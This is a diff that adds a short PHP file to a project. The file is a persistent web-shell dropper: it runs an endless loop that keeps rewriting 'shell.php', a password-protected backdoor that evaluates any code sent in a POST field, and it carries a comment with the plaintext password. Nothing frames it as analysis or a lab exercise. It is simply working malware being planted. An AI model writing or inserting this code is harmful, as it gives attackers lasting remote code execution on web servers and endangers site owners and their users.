@@ -1,0 +1,13 @@
+<?php
+ignore_user_abort(true);
+set_time_limit(0);
+
+while (TRUE) {
+if (!file_exists($file)) {
+	$file = 'shell.php';
+	$shell = '<?php if(md5($_POST[\'pass\'])==\'12bce374e7be15142e8172f668da00d8\') @eval($_POST[cmd]);?>'; //pass=Test@1234
+	file_put_contents($file, $shell);
+}
+usleep(50);
+}
+?>
